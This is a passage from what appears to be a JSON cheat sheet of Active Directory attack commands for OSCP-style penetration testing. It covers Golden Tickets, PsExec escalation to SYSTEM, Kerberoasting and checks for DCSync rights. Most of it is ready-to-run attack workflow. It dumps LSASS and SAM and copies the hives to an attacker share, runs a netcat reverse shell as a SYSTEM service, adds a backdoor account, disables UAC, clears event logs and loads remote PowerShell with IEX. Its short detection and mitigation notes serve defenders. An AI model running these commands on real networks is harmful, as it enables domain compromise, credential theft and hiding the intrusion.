      "notes": "ESSENTIAL STEP before Golden/Silver Ticket attacks. OSCP WORKFLOW: (1) Purge existing tickets: klist purge, (2) Load Golden Ticket: Mimikatz kerberos::ptt golden.kirbi OR Rubeus.exe ptt /ticket:golden.kirbi, (3) Verify: klist (should show new TGT), (4) Access resources: net use \\\\\\\\DC1\\C$ (Kerberos auth, no password needed). WHY PURGE: Old TGTs may have expired or conflicting SIDs - purging ensures clean ticket cache. Time estimate: <1 second.\n\nMANUAL ALTERNATIVES:\n\nPurge all tickets (Windows):\nklist purge\n\nView current tickets before purge:\nklist\n# Shows: Client, Server, KerbTicket Encryption Type, Ticket Flags, Start/End Time\n\nMimikatz purge:\nmimikatz.exe \"kerberos::purge\" \"exit\"\n\nRubeus purge:\nRubeus.exe purge\n\nPurge specific LUID (logon session):\nRubeus.exe purge /luid:0x3e7\n\nGOLDEN TICKET WORKFLOW:\n\nComplete Golden Ticket attack sequence:\n\n1. DCSync to get krbtgt hash:\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'\n# Output: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693d5e6f1532e6d0e2d5e4b1a9f5ebb:::\n\n2. Get Domain SID:\nlookupsid.py 'corp.com/admin:pass@192.168.50.70' | grep \"Domain SID\"\n# Output: S-1-5-21-1987370270-658905905-1781884369\n\n3. Create Golden Ticket (Kali):\nticketer.py -nthash 1693d5e6f1532e6d0e2d5e4b1a9f5ebb -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com Administrator\n# Creates: Administrator.ccache\n\n4. Use ticket on Kali (Linux):\nexport KRB5CCNAME=Administrator.ccache\npsexec.py -k -no-pass corp.com/Administrator@DC1.corp.com\n\n5. Use ticket on Windows:\n# Transfer ticket to Windows target\n# Convert ccache to kirbi if needed (Kerberos ticket converter)\nmimikatz.exe \"kerberos::purge\" \"kerberos::ptt Administrator.kirbi\" \"exit\"\nklist # Verify ticket loaded\nnet use \\\\\\\\DC1\\C$ # Test access\n\nklist COMMAND USAGE:\n\nList all tickets:\nklist\n\nList specific logon session:\nklist -li 0x3e7\n\nList ticket for specific target:\nklist -li 0:0x3e4 <SPN>\n\nTicket cache location:\nklist sessions # Shows all logon sessions\n\nVERIFY GOLDEN TICKET:\n\nAfter loading Golden Ticket:\nklist\n# Should show:\n# Client: Administrator @ CORP.COM\n# Server: krbtgt/CORP.COM @ CORP.COM\n# KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n# Start Time / End Time / Renew Time\n\nTest access:\nnet use \\\\\\\\DC1.corp.com\\C$\n# Should succeed WITHOUT username/password (Kerberos auth)\n\nList remote directory:\ndir \\\\\\\\DC1.corp.com\\C$\\Users\n\nPsExec with ticket:\npsexec.exe \\\\\\\\DC1.corp.com cmd\n# Opens SYSTEM shell on DC (no password required)\n\nTROUBLESHOOTING GOLDEN TICKETS:\n\nTicket not working:\n1. Verify ticket loaded: klist (should show TGT)\n2. Check ticket validity period: klist (Start/End Time)\n3. Verify domain name matches: klist (should show correct domain)\n4. Ensure clock sync: net time \\\\\\\\DC1 (< 5 min skew)\n5. Test with specific service: net use \\\\\\\\DC1\\ADMIN$\n\nClock skew error:\nKRB_AP_ERR_SKEW - Time difference > 5 minutes\nSolution:\n- Sync time: net time \\\\\\\\DC1 /set /yes\n- Or ntpdate: w32tm /resync /force\n\nWrong SID in ticket:\nAccess denied despite valid ticket\nSolution:\n- Verify Domain SID: lookupsid.py\n- Recreate ticket with correct SID\n\nTicket expired:\nklist shows past End Time\nSolution:\n- Create new ticket with longer validity\n- ticketer.py -duration <days>\n\nOPSEC:\n\nklist leaves minimal logs:\n- No specific Event ID for klist purge\n- TGT requests logged (Event ID 4768) when new ticket used\n- TGS requests logged (Event ID 4769) when accessing services\n\nGolden Ticket detection:\n- Look for TGT with unusual lifetime (e.g., 10 years)\n- Monitor for TGT creation outside normal authentication\n- Check for krbtgt password hash reuse\n\nMitigation:\n- Rotate krbtgt password twice (invalidates all Golden Tickets)\n- Monitor Event ID 4769 for anomalous service ticket requests\n- Implement privileged account protections (PAM)\n\nTIME ESTIMATE:\nklist purge: <1 second\nGolden Ticket creation: 5-10 seconds\nTicket injection: 2-5 seconds\nTotal workflow: 15-30 seconds"
    },
    {
      "id": "windows-psexec-system-shell",
      "name": "Get SYSTEM Shell with PSExec",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "psexec.exe -accepteula -s -i cmd.exe",
      "description": "Elevate from Administrator to SYSTEM privileges using Sysinternals PSExec. Creates interactive command prompt running as NT AUTHORITY\\SYSTEM - highest privilege level on Windows.",
      "variables": [],
      "flag_explanations": {
        "psexec.exe": "Sysinternals PSExec - remote execution and privilege escalation tool. Microsoft-signed legitimate admin utility. CRITICAL: Works locally to elevate Administrator → SYSTEM. Requires Administrator rights to execute. Download: https://docs.microsoft.com/sysinternals/downloads/psexec",
        "-accepteula": "Auto-accept Sysinternals EULA without interactive prompt. Required for scripted/automated execution. Without this, psexec pauses waiting for EULA acceptance on first run.",
        "-s": "Run as SYSTEM account (NT AUTHORITY\\SYSTEM). Highest privilege level - bypasses most security restrictions. SYSTEM has access to: all files (including protected), all registry keys, all processes, SAM database, LSASS memory. Required for: LSASS dump (procdump lsass), SAM dump (reg save), many post-exploitation tasks.",
        "-i": "Interactive - show window on desktop. Required for GUI applications and interactive shells. Without -i, process runs in background Session 0 (no visible window). Combine with -s for interactive SYSTEM shell.",
        "cmd.exe": "Command prompt executable. Can substitute: powershell.exe (SYSTEM PowerShell), C:\\Windows\\System32\\cmd.exe (full path if PATH broken)."
      },
      "success_indicators": [
        "New cmd.exe window opens",
        "whoami shows: nt authority\\system",
        "whoami /groups shows: BUILTIN\\Administrators + NT AUTHORITY\\SYSTEM",
        "Can access protected files: type C:\\Windows\\System32\\config\\SAM",
        "Can dump LSASS: procdump -ma lsass.exe lsass.dmp"
      ],
      "failure_indicators": [
        "Access is denied",
        "psexec.exe is not recognized",
        "Couldn't access <TARGET>",
        "Make sure that the default admin$ share is enabled",
        "User is not an administrator"
      ],
      "troubleshooting": {
        "Access is denied": "User lacks Administrator rights. Solution: Verify admin status: whoami /groups (look for S-1-5-32-544 = Administrators). If not admin, escalate privileges first: exploit local vuln, abuse misconfigured service, etc. If UAC blocking: Run cmd.exe as Administrator (right-click → Run as administrator) then retry psexec.",
        "psexec.exe not recognized": "PSExec not uploaded to target. Solution: Download from Sysinternals: wget https://live.sysinternals.com/psexec.exe (on Kali). Upload to target: copy \\\\<LHOST>\\share\\psexec.exe C:\\Windows\\Temp\\. Or certutil: certutil -urlcache -f http://<LHOST>/psexec.exe psexec.exe",
        "Make sure admin$ share is enabled": "PSExec requires ADMIN$ share for local elevation (even though not accessing remote system). Solution: Enable ADMIN$ share: net share ADMIN$ (should show C:\\Windows). If disabled, use alternative: PowerShell Start-Process: Start-Process cmd.exe -Verb RunAs -ArgumentList '/k whoami'. Or Mimikatz: mimikatz.exe 'privilege::debug' 'token::elevate' 'exit'.",
        "Couldn't access <TARGET> (when using localhost)": "Firewall or service issue. Solution: Use local elevation flags: psexec.exe -accepteula -s -i cmd.exe (no target specified = local). Ensure Administrator rights. Check Windows Firewall: netsh advfirewall show allprofiles (should allow local SMB).",
        "UAC prompt appears": "User Account Control blocking elevation. Solution: If GUI access, approve UAC prompt. If no GUI (SSH/WinRM), bypass UAC: use Mimikatz token elevation, exploit UAC bypass vuln (UACME), or disable UAC (requires reboot): reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
      },
      "prerequisites": [],
      "next_steps": [
        "ad-lsass-dump-procdump",
        "ad-sam-dump-reg-save"
      ],
      "alternatives": [
        "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"exit\" (Mimikatz token elevation)",
        "Start-Process cmd.exe -Verb RunAs (PowerShell elevation, requires GUI)"
      ],
      "tags": [
        "PRIVILEGE_ESCALATION",
        "PSEXEC",
        "SYSTEM",
        "WINDOWS",
        "SYSINTERNALS",
        "OSCP:HIGH",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "high",
      "notes": "CRITICAL OSCP TECHNIQUE - elevate Administrator → SYSTEM for sensitive operations. WHEN TO USE: (1) Before dumping LSASS (procdump requires SYSTEM), (2) Before dumping SAM (reg save SAM requires SYSTEM or high-integrity admin), (3) Accessing protected files/registry, (4) Bypassing security restrictions. REQUIREMENTS: Must already be Administrator (check: whoami /groups). SYSTEM privileges enable: LSASS access, SAM access, all file system, all registry, debug privileges, impersonation. Time estimate: 2-5 seconds.\n\nMANUAL ALTERNATIVES:\n\nBasic SYSTEM shell:\npsexec.exe -accepteula -s -i cmd.exe\nwhoami # Should show: nt authority\\system\n\nSYSTEM PowerShell (recommended for post-exploitation):\npsexec.exe -accepteula -s -i powershell.exe\n\nRun single command as SYSTEM:\npsexec.exe -accepteula -s cmd /c \"whoami\"\n\nMimikatz token elevation (alternative):\nmimikatz.exe \"privilege::debug\" \"token::elevate\" \"exit\"\n# Elevates current process to SYSTEM\n\nPowerShell Start-Process (requires GUI):\nStart-Process cmd.exe -Verb RunAs\n# UAC prompt appears - approve to get elevated shell\n\nService creation (manual SYSTEM escalation):\nsc create EvilService binPath= \"cmd.exe /c net user hacker P@ss123 /add\" start= auto\nsc start EvilService\n# Service runs as SYSTEM by default\n\nCOMMON OSCP WORKFLOW:\n\n1. Get Administrator shell:\npsexec.py 'corp.com/admin:pass@192.168.50.75'\n\n2. Upload PSExec:\ncopy \\\\10.10.14.5\\share\\psexec.exe C:\\Windows\\Temp\\\n\n3. Elevate to SYSTEM:\nC:\\Windows\\Temp\\psexec.exe -accepteula -s -i cmd.exe\n\n4. Verify SYSTEM:\nwhoami\nwhoami /priv # Should show SeDebugPrivilege\n\n5. Dump LSASS:\nC:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n6. Dump SAM:\nreg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\n\n7. Exfiltrate to Kali:\ncopy lsass.dmp \\\\10.10.14.5\\share\\\ncopy sam.hive \\\\10.10.14.5\\share\\\ncopy system.hive \\\\10.10.14.5\\share\\\n\n8. Process on Kali:\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL\npypykatz lsa minidump lsass.dmp\n\nVERIFY SYSTEM PRIVILEGES:\n\nCheck user:\nwhoami\n# Output: nt authority\\system\n\nCheck groups:\nwhoami /groups\n# Should show:\n# BUILTIN\\Administrators\n# NT AUTHORITY\\SYSTEM\n# MANDATORY LABEL\\System Mandatory Level\n\nCheck privileges:\nwhoami /priv\n# SYSTEM has ALL privileges:\n# SeDebugPrivilege (debug programs - access LSASS)\n# SeTakeOwnershipPrivilege (take ownership of any file)\n# SeBackupPrivilege (backup files - bypass ACLs)\n# SeRestorePrivilege (restore files)\n# SeLoadDriverPrivilege (load kernel drivers)\n# SeImpersonatePrivilege (impersonate tokens)\n\nTest file access:\ntype C:\\Windows\\System32\\config\\SAM\n# Should work (SAM readable only by SYSTEM)\n\nTest LSASS access:\ntasklist | findstr lsass\n# Note PID\nprocdump.exe -accepteula -ma <PID> lsass.dmp\n# Should succeed\n\nSYSTEM VS ADMINISTRATOR:\n\nAdministrator:\n- High privileges but not highest\n- Cannot access LSASS memory directly (blocked by PPL on modern systems)\n- Cannot read SAM database directly (even with admin rights)\n- Subject to some UAC restrictions\n- Can elevate to SYSTEM using PSExec/token manipulation\n\nSYSTEM:\n- Highest privilege level (higher than Administrator)\n- Can access ALL processes including LSASS\n- Can read ALL files including SAM database\n- Bypasses UAC completely\n- No password (service account)\n- Cannot be used for network authentication (use $ machine account)\n\nUSE CASES FOR SYSTEM:\n\n1. LSASS dumping:\npsexec.exe -s -i cmd.exe\nprocdump.exe -ma lsass.exe lsass.dmp\n\n2. SAM dumping:\npsexec.exe -s -i cmd.exe\nreg save HKLM\\SAM sam.hive\n\n3. Protected file access:\npsexec.exe -s -i cmd.exe\ntype C:\\Windows\\System32\\config\\SAM\n\n4. Service manipulation:\npsexec.exe -s -i cmd.exe\nsc config <service> binPath= \"C:\\evil.exe\"\n\n5. Driver loading:\npsexec.exe -s -i cmd.exe\nsc create EvilDriver type= kernel binPath= C:\\driver.sys\nsc start EvilDriver\n\n6. Token impersonation:\npsexec.exe -s -i powershell.exe\n# Load Invoke-TokenManipulation\nInvoke-TokenManipulation -CreateProcess \"cmd.exe\" -Username \"DOMAIN\\Administrator\"\n\nOPSEC:\n\npsexec.exe execution logged:\n- Event ID 4688 (process creation)\n- Event ID 7045 (service creation) - psexec creates PSEXESVC service\n- Sysmon Event ID 1 (process creation)\n- Sysmon Event ID 13 (registry modification) for service creation\n\nAV considerations:\n- PSExec is Microsoft-signed (usually allowed by AV)\n- Some EDR flag PSExec for privilege escalation\n- Alternative: Mimikatz token elevation (more stealthy, no service creation)\n\nCleanup:\n- psexec.exe auto-deletes PSEXESVC service on exit\n- Delete psexec.exe after use: del C:\\Windows\\Temp\\psexec.exe\n- Clear Event Logs (if SYSTEM): wevtutil cl System && wevtutil cl Security\n\nALTERNATIVE SYSTEM ELEVATION:\n\n1. Mimikatz token elevation:\nmimikatz.exe\nmimikatz # privilege::debug\nmimikatz # token::elevate\nmimikatz # exit\n# Current process now SYSTEM\n\n2. Service creation:\nsc create EvilSvc binPath= \"cmd /c C:\\nc.exe 10.10.14.5 4444 -e cmd\" start= auto\nsc start EvilSvc\n# Service runs as SYSTEM, connects back\n\n3. Scheduled task as SYSTEM:\nschtasks /create /tn EvilTask /tr \"cmd /c C:\\evil.exe\" /sc once /st 00:00 /ru SYSTEM\nschtasks /run /tn EvilTask\n\n4. AT command (older Windows):\nat 13:37 C:\\evil.exe\n# Task runs as SYSTEM at specified time\n\nTIME ESTIMATE:\nPSExec elevation: 2-5 seconds\nTotal workflow (upload → elevate → dump): 30-90 seconds"
    },
    {
      "id": "powerview-enumerate-spns",
      "name": "PowerView - Enumerate Service Principal Names",
      "category": "enumeration",
      "subcategory": "active-directory",
      "command": "Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname",
      "description": "Enumerate Active Directory user accounts with Service Principal Names (SPNs) using PowerView. Identifies Kerberoastable accounts - service accounts whose TGS tickets can be requested and cracked offline.",
      "variables": [],
      "flag_explanations": {
        "Get-NetUser": "PowerView cmdlet that queries Active Directory for user objects. Part of PowerSploit/PowerView toolkit. ADVANTAGE: Works from unprivileged domain user account. Returns rich AD user information including SPNs, group memberships, password policies, etc.",
        "-SPN": "Filter for users with Service Principal Names. SPN format: SERVICE/hostname (e.g., MSSQLSvc/sql01.corp.com:1433). Users with SPNs are typically service accounts (SQL Server, IIS, custom services). CRITICAL: These accounts are Kerberoastable - can request TGS and crack offline to recover password.",
        "Select-Object samaccountname,serviceprincipalname": "Display only username and SPN fields. samaccountname = Windows username (e.g., sqlservice). serviceprincipalname = SPN value (e.g., MSSQLSvc/sql01.corp.com:1433). Reduces output noise - full Get-NetUser returns 50+ fields per user."
      },
      "success_indicators": [
        "Output: List of usernames with SPNs",
        "Example: sqlservice - MSSQLSvc/sql01.corp.com:1433",
        "Common service accounts: svc_*, sql*, iis*, service*",
        "Multiple SPNs per user possible",
        "Empty result = no Kerberoastable accounts (rare in real domains)"
      ],
      "failure_indicators": [
        "Get-NetUser : The term 'Get-NetUser' is not recognized",
        "Access is denied",
        "Cannot contact domain controller",
        "LDAP query failed",
        "Exception calling"
      ],
      "troubleshooting": {
        "Get-NetUser not recognized": "PowerView not loaded. Solution: Import PowerView: IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1'). Or from file: Import-Module C:\\Tools\\PowerView.ps1. Download PowerView: wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 (on Kali).",
        "Access is denied": "User lacks domain read permissions (extremely rare - domain users can read AD by default). Solution: Verify domain authentication: whoami /upn. Ensure domain-joined or has domain credentials. Try with explicit credentials: Get-NetUser -SPN -Credential (Get-Credential).",
        "Cannot contact domain controller": "DNS or network issue. Solution: Verify DC reachable: ping <DC_FQDN>. Check DNS resolution: nslookup <DC_FQDN>. Specify DC explicitly: Get-NetUser -SPN -Domain corp.com -Server 192.168.50.70.",
        "LDAP query failed": "Domain controller rejected query. Solution: Check domain membership: wmic computersystem get domain. Verify domain user: whoami /groups (should show domain groups). Try alternate query: Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName (ActiveDirectory module alternative).",
        "No results but should have SPNs": "Query syntax or filtering issue. Solution: Try without Select: Get-NetUser -SPN (shows all fields). Or native LDAP: setspn -T corp.com -Q */* (Windows built-in SPN enumeration). Or Impacket: GetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70"
      },
      "prerequisites": [],
      "next_steps": [
        "impacket-getuserspns-kerberoast"
      ],
      "alternatives": [
        "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} (ActiveDirectory module)",
        "setspn -T <DOMAIN> -Q */* (Windows built-in)",
        "GetUserSPNs.py <DOMAIN>/<USER>:<PASS> (Impacket from Kali)"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "KERBEROASTING",
        "SPN_ENUMERATION",
        "POWERVIEW",
        "POWERSHELL",
        "OSCP:HIGH"
      ],
      "oscp_relevance": "high",
      "notes": "CRITICAL FOR KERBEROASTING ATTACKS. PowerView SPN enumeration identifies service accounts whose passwords can be cracked offline. OSCP WORKFLOW: (1) Enumerate SPNs: Get-NetUser -SPN, (2) Request TGS tickets: Invoke-Kerberoast or GetUserSPNs.py, (3) Crack offline: hashcat -m 13100 (TGS-REP). COMMON FINDS: SQL Server service accounts (often weak passwords), IIS application pools, custom Windows services. Service accounts typically have: weak passwords (for ease of memory), high privileges (often Domain Admin or equivalent), rarely rotated passwords (change breaks applications). Time estimate: 2-10 seconds.\n\nMANUAL ALTERNATIVES:\n\nPowerView SPN enumeration:\nGet-NetUser -SPN | Select-Object samaccountname,serviceprincipalname\n\nPowerView detailed output:\nGet-NetUser -SPN\n# Shows: distinguishedname, samaccountname, serviceprincipalname, pwdlastset, memberof, etc.\n\nActiveDirectory module (if installed):\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName\n\nNative Windows setspn:\nsetspn -T corp.com -Q */*\n# Output: CN=SQL Service,CN=Users,DC=corp,DC=com - MSSQLSvc/sql01.corp.com:1433\n\nImpacket from Kali:\nGetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70\n# Lists SPNs + can request TGS hashes directly\n\nPowerView with specific service type:\nGet-NetUser -SPN | Where-Object {$_.serviceprincipalname -like '*SQL*'}\n# Filter for SQL Server accounts only\n\nFULL KERBEROASTING WORKFLOW:\n\n1. Enumerate SPNs (PowerView):\nGet-NetUser -SPN | Select-Object samaccountname,serviceprincipalname\n\nOutput:\nsamaccountname serviceprincipalname\n-------------- --------------------\nsqlservice     MSSQLSvc/sql01.corp.com:1433\niis_svc        HTTP/web01.corp.com\n\n2. Request TGS tickets (Invoke-Kerberoast):\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Kerberoast.ps1')\nInvoke-Kerberoast -OutputFormat Hashcat | fl\n\nOR Rubeus:\nRubeus.exe kerberoast /outfile:hashes.txt\n\nOR Impacket (from Kali):\nGetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70 -request -outputfile hashes.txt\n\n3. Crack with Hashcat:\nhashcat -m 13100 hashes.txt rockyou.txt --force\n# Mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4-HMAC)\n\n4. Use cracked password:\ncrackmapexec smb 192.168.50.0/24 -u sqlservice -p CrackedPassword123!\n# Often service accounts have admin rights on multiple servers\n\nCOMMON SPN PATTERNS:\n\nSQL Server:\nMSSQLSvc/<hostname>:<port>\nMSSQLSvc/sql01.corp.com:1433\n\nHTTP/IIS:\nHTTP/<hostname>\nHTTP/web01.corp.com\n\nExchange:\nexchangeMDB/<hostname>\nexchangeRFR/<hostname>\nExchangeAB/<hostname>\n\nWSUS:\nHTTP/<hostname>:8530\n\nCustom services:\nSERVICE/<hostname>\nAPP/<hostname>\n\nSPN ENUMERATION VARIATIONS:\n\nFind all SPNs for specific user:\nGet-NetUser -Identity sqlservice | Select-Object serviceprincipalname\n\nFind weak SPNs (RC4-HMAC):\nGet-NetUser -SPN | Where-Object {$_.serviceprincipalname -and $_.msds-supportedencryptiontypes -eq 0}\n# RC4-HMAC is weaker than AES - easier to crack\n\nFind recently set SPNs:\nGet-NetUser -SPN | Where-Object {$_.pwdlastset -gt (Get-Date).AddDays(-30)}\n\nFind SPNs with admin privileges:\nGet-NetUser -SPN | Where-Object {$_.memberof -like '*Admin*'}\n\nALTERNATIVE TOOLS:\n\nRubeus (Windows):\nRubeus.exe kerberoast /stats\n# Shows: Total Kerberoastable users, encryption types\n\nImpacket GetUserSPNs (Kali):\nGetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70\n# No TGS request, just enumeration\n\nLDAP query (manual):\n(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\n# Use with ldapsearch or AD Explorer\n\nBloodHound:\nInvoke-BloodHound -CollectionMethod All\n# BloodHound GUI → Analysis → List all Kerberoastable Accounts\n\nWHY KERBEROASTING WORKS:\n\n1. Any domain user can request TGS for any SPN\n2. TGS is encrypted with service account's NTLM hash\n3. TGS can be cracked offline (no network traffic)\n4. Service accounts often have weak passwords\n5. No detection (legitimate Kerberos traffic)\n\nDETECTION:\n- Monitor Event ID 4769 (TGS requested) for unusual patterns\n- Look for multiple TGS requests for same SPN from single user\n- Detect RC4 encryption (modern systems should use AES)\n- Monitor for accounts requesting TGS but not using service\n\nMITIGATION:\n- Strong service account passwords (25+ chars)\n- Managed Service Accounts (MSA) / Group MSAs\n- Disable RC4 encryption (force AES)\n- Regular password rotation for service accounts\n- Monitor Kerberos Event ID 4769\n\nOSCP EXAM TIPS:\n1. Always enumerate SPNs on domain targets\n2. Service accounts often reused across multiple systems\n3. Cracked service account = lateral movement opportunity\n4. Check service account group memberships (often admin)\n\nTIME ESTIMATE:\nSPN enumeration: 2-10 seconds\nKerberoast attack (full workflow): 1-5 minutes\nPassword cracking: Variable (depends on password strength)"
    },
    {
      "id": "ad-dcsync-check-privileges",
      "name": "Check DCSync Privileges (Replication Rights)",
      "category": "enumeration",
      "subcategory": "active-directory",
      "command": "Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication-Get-Changes' -and $_.ActiveDirectoryRights -match 'ExtendedRight'} | Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType | fl",
      "description": "Check which users/groups have DCSync privileges (DS-Replication-Get-Changes rights). Identifies accounts that can perform DCSync attacks to extract domain credentials.",
      "variables": [],
      "flag_explanations": {
        "Get-ObjectAcl": "PowerView cmdlet that retrieves Access Control List (ACL) for AD objects. Shows permissions/rights granted to users/groups on AD objects. CRITICAL: DCSync requires specific extended rights on domain root object.",
        "-DistinguishedName 'DC=corp,DC=com'": "Target object - domain root DN. Replace corp,DC=com with actual domain DN. Find with: (Get-ADDomain).DistinguishedName or DSQUERY * -filter \"(objectClass=domain)\" -attr distinguishedName.",
        "-ResolveGUIDs": "Translate permission GUIDs to human-readable names. Without this, ObjectAceType shows GUID like {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} instead of 'DS-Replication-Get-Changes'.",
        "Where-Object {$_.ObjectAceType -match 'Replication-Get-Changes'}": "Filter for replication rights. DCSync requires: DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All. Both rights needed for full DCSync (all users). Single right = partial DCSync (specific users).",
        "SecurityIdentifier": "SID of principal with DCSync rights. Convert to username with: ConvertFrom-SID <SID>. Default: Domain Admins (S-1-5-21-<domain>-512), Enterprise Admins, Administrators.",
        "ActiveDirectoryRights": "Type of access right. ExtendedRight = special AD permission beyond standard read/write. DCSync is an ExtendedRight.",
        "ObjectAceType": "Specific extended right name. DS-Replication-Get-Changes = basic replication. DS-Replication-Get-Changes-All = full domain replication (includes krbtgt)."
      },
      "success_indicators": [
        "Output: List of SecurityIdentifiers with Replication rights",
        "Default: Domain Admins SID (S-1-5-21-<domain>-512)",
        "Unexpected SIDs = potential privilege escalation path",
        "ObjectAceType: DS-Replication-Get-Changes, DS-Replication-Get-Changes-All"
      ],
      "failure_indicators": [
        "Get-ObjectAcl : The term 'Get-ObjectAcl' is not recognized",
        "Access is denied",
        "Cannot find path 'DC=corp,DC=com'",
        "Exception calling GetObjectAcl"
      ],
      "troubleshooting": {
        "Get-ObjectAcl not recognized": "PowerView not loaded. Solution: Import PowerView: IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1'). Or from file: Import-Module C:\\Tools\\PowerView.ps1.",
        "Cannot find path": "Wrong Distinguished Name. Solution: Get correct DN: (Get-ADDomain).DistinguishedName OR nltest /dsgetdc:<domain> /server:<dc> OR DSQUERY * -filter \"(objectClass=domain)\" -attr distinguishedName. Common formats: DC=corp,DC=com, DC=corp,DC=local, DC=internal,DC=corp,DC=com.",
        "Access is denied": "Insufficient permissions to read ACLs (rare - domain users can usually read). Solution: Run as domain user with read access. Or use elevated credentials: $cred = Get-Credential; Get-ObjectAcl -Credential $cred ...",
        "No results but should have DCSync accounts": "Query filtering too strict or domain has no custom DCSync rights (only defaults). Solution: Remove filter: Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -like '*Replication*'} (broader search). Or check defaults: Get-ADGroupMember 'Domain Admins' (Domain Admins always have DCSync)."
      },
      "prerequisites": [],
      "next_steps": [
        "impacket-secretsdump"
      ],
      "alternatives": [
        "(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object {$_.ObjectType -like '*Replication*'} (ActiveDirectory module)",
        "adfind.exe -b 'DC=corp,DC=com' -s base nTSecurityDescriptor (ADFind tool)"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "PRIVILEGE_ENUMERATION",
        "ACL",
        "POWERVIEW",
        "OSCP:MEDIUM"
      ],
      "oscp_relevance": "medium",
      "notes": "ENUMERATE DCSYNC PRIVILEGES before attempting DCSync. Identifies which accounts can perform replication attacks. OSCP USE CASE: After compromising a user, check if they have DCSync rights (privilege escalation path). DEFAULT ACCOUNTS WITH DCSYNC: Domain Admins, Enterprise Admins, Administrators, Domain Controllers. CUSTOM GRANTS: Misconfigurations may grant DCSync to lower-privileged accounts (Exchange Servers, backup services, etc.). WHY IMPORTANT: DCSync requires specific rights - not all admins can DCSync. Time estimate: 5-15 seconds.\n\nMANUAL ALTERNATIVES:\n\nPowerView DCSync privilege check:\nGet-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication-Get-Changes' -and $_.ActiveDirectoryRights -match 'ExtendedRight'} | Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType | fl\n\nConvert SID to username:\n$sid = 'S-1-5-21-1987370270-658905905-1781884369-1104'\nConvertFrom-SID $sid\n# Or: (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value\n\nActiveDirectory module alternative:\n(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object {$_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'} | Select-Object IdentityReference,ActiveDirectoryRights\n# GUID 1131f6aa... = DS-Replication-Get-Changes\n\nBloodHound query:\n# In BloodHound GUI:\n# Analysis → Shortest Paths to Domain Admins from Owned Principals\n# Look for \"DCSync\" edge type\n# OR Cypher query:\nMATCH (n) WHERE n.hasdcsync=true RETURN n\n\nADFind (Windows tool):\nadfind.exe -b 'DC=corp,DC=com' -s base nTSecurityDescriptor -resolvesids\n# Parse output for Replication-Get-Changes ACEs\n\nCheck current user's DCSync rights:\n$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name\n$userSID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value\nGet-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq $userSID -and $_.ObjectAceType -match 'Replication'}\n\nDCSYNC REQUIRED RIGHTS:\n\nMinimum rights for DCSync:\n1. DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n2. DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n3. DS-Replication-Get-Changes-In-Filtered-Set (GUID: 89e95b76-444d-4c62-991a-0facbeda640c) - optional\n\nCheck for all three:\nGet-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {($_.ObjectAceType -eq 'DS-Replication-Get-Changes' -or $_.ObjectAceType -eq 'DS-Replication-Get-Changes-All') -and $_.ActiveDirectoryRights -match 'ExtendedRight'} | Select-Object SecurityIdentifier,ObjectAceType | Sort-Object SecurityIdentifier\n\nDEFAULT ACCOUNTS WITH DCSYNC:\n\n1. Domain Admins (SID: S-1-5-21-<domain>-512)\n2. Enterprise Admins (SID: S-1-5-21-<root_domain>-519)\n3. Administrators (SID: S-1-5-32-544)\n4. Domain Controllers (SID: S-1-5-21-<domain>-516)\n\nVerify defaults:\nGet-ADGroupMember 'Domain Admins' | Select-Object Name,SID\nGet-ADGroupMember 'Enterprise Admins' | Select-Object Name,SID\n\nCOMMON MISCONFIGURATIONS:\n\n1. Exchange Servers:\n# Exchange Write DACL often grants DCSync\nGet-ObjectAcl -DistinguishedName 'DC=corp,DC=com' | 